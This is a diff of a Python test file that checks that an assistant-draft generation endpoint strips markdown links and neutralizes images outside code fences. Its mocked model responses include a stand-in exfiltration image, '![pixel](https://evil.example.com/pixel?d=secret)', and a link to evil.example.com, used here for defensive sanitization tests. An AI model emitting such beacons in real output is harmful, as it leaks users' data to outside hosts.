@@ -192,7 +192,8 @@ def test_generate_assistant_draft_keeps_code_and_strips_links_outside(
 ) -> None:
     responses = {
         "assistant-draft-system-prompt": (
-            "Validate with `^[A-Z](foo)$` und mit ```\n[pattern](https://beispiel.example.com)\n```.\n"
+            "Validate with `^[A-Z](foo)$` und mit\n"
+            "```\n[pattern](https://beispiel.example.com)\n```\n"
             "Siehe [Anleitung](https://evil.example.com/?d=x)."
         ),
         "assistant-draft-description": "Beschreibung",
@@ -213,6 +214,30 @@ def test_generate_assistant_draft_keeps_code_and_strips_links_outside(
     # Links outside code are still reduced to their label.
     assert "evil.example.com" not in body["system_prompt"]
     assert "Anleitung" in body["system_prompt"]
+
+
+@pytest.mark.integration
+@patch("core.llm_helpers.ModelRegistry.get_model")
+def test_generate_assistant_draft_sanitize_after_midline_tilde(
+    mock_get_model, test_client: TestClient, langfuse_root
+) -> None:
+    responses = {
+        "assistant-draft-system-prompt": "Prüfe Text ~~~\n![pixel](https://evil.example.com/pixel?d=secret)",
+        "assistant-draft-description": "Beschreibung",
+        "assistant-draft-title": "Titel",
+    }
+    mock_get_model.return_value = _FakeConfiguredModel(response_by_run_name=responses)
+
+    resp = test_client.post(
+        "/v1/generations/assistant-draft",
+        json={"prompt_seed": "Hilft bei Meeting-Protokollen"},
+    )
+
+    assert resp.status_code == 200, resp.text
+    body = resp.json()
+    # A mid-line tilde run does not open a fenced block: the image is neutralized.
+    assert "](http" not in body["system_prompt"]
+    assert "pixel" in body["system_prompt"]
 
 
 @pytest.mark.integration
